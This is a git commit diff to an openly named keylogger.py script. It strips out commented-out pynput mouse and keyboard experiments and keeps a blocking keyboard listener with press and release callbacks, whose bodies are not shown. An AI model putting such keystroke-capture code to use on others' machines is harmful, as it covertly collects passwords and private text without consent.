2ca125e5c814000feba837bc1ce58a9da20c3019
natootejas13 <150653677+natootejas13@users.noreply.github.com>
2025-08-13 22:59:00 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,29 +1,3 @@
-# import pynput as pyinp
-# from pynput import keyboard
-#
-# with open("C:/Users/Lenovo/Desktop/keylogger.txt", "a") as file:
-#     data  = file.writelines("\nChris")
-
-# from pynput.mouse import Controller, Button
-# from pynput.keyboard import Key,Controller
-# keyboard = Controller()
-# keyboard.press(Key.space)
-# keyboard.release(Key.space)
-#
-# keyboard.press('a')
-# keyboard.release('a')
-# print("current pointer position is {}".format(mouse.position))
-#
-# mouse.position = (900,700)
-#
-# mouse.move(100,-500)
-#
-# mouse.press(Button.left)
-# mouse.release(Button.left)
-#
-# mouse.click(Button.left,2)
-
-# mouse.scroll(0,2)
 
 from pynput import keyboard
 
@@ -56,3 +30,4 @@ def on_release(key):
 # Blocking listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
